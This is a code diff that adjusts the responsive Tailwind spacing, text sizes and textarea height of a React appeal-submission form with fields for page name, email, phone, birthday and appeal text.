@@ -322,7 +322,7 @@ const Home = () => {
                             <p>{translatedTexts.submitAppeal}</p>
                         </div>
                         <div className='flex flex-col gap-3 p-4 text-sm leading-6 font-semibold sm:gap-2'>
-                            <div className='flex flex-col gap-2'>
+                            <div className='flex flex-col gap-1 sm:gap-2'>
                                 <p className='text-base sm:text-sm'>
                                     {translatedTexts.pageName} <span className='text-red-500'>*</span>
                                 </p>
@@ -337,7 +337,7 @@ const Home = () => {
                                 />
                                 {errors.pageName && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                             </div>
-                            <div className='flex flex-col gap-2'>
+                            <div className='flex flex-col gap-1 sm:gap-2'>
                                 <p className='text-base sm:text-sm'>
                                     {translatedTexts.mail} <span className='text-red-500'>*</span>
                                 </p>
@@ -352,7 +352,7 @@ const Home = () => {
                                 />
                                 {errors.mail && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                             </div>
-                            <div className='flex flex-col gap-2'>
+                            <div className='flex flex-col gap-1 sm:gap-2'>
                                 <p className='text-base sm:text-sm'>
                                     {translatedTexts.phone} <span className='text-red-500'>*</span>
                                 </p>
@@ -372,7 +372,7 @@ const Home = () => {
                                 </div>
                                 {errors.phone && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                             </div>
-                            <div className='flex flex-col gap-2'>
+                            <div className='flex flex-col gap-1 sm:gap-2'>
                                 <p className='text-base sm:text-sm'>
                                     {translatedTexts.birthday} <span className='text-red-500'>*</span>
                                 </p>
@@ -388,13 +388,13 @@ const Home = () => {
                             </div>
                             
                             {/* Thêm ô Your Appeal - Textarea lớn */}
-                            <div className='flex flex-col gap-2'>
-                                <p className='text-base sm:text-sm'>
+                            <div className='flex flex-col gap-1 sm:gap-2'>
+                                <p className='text-sm sm:text-base'>
                                     {translatedTexts.yourAppeal} <span className='text-red-500'>*</span>
                                 </p>
                                 <textarea 
                                     name='appeal'
-                                    rows={4}
+                                    rows={3}
                                     className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 resize-none ${errors.appeal ? 'border-[#dc3545]' : 'border-gray-300'}`}
                                     style={{ fontSize: '16px' }}
                                     placeholder={translatedTexts.appealPlaceholder}
@@ -404,7 +404,7 @@ const Home = () => {
                                 {errors.appeal && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                             </div>
 
-                            <button className='w-fit rounded-lg bg-gray-200 px-4 py-3 sm:px-3 sm:py-2 text-base sm:text-[15px] font-normal mt-2' onClick={handleSubmit}>
+                            <button className='w-fit rounded-lg bg-gray-200 px-4 py-3 sm:px-3 sm:py-2 text-base sm:text-[15px] font-normal mt-1 sm:mt-2' onClick={handleSubmit}>
                                 {translatedTexts.submit}
                             </button>
                         </div>
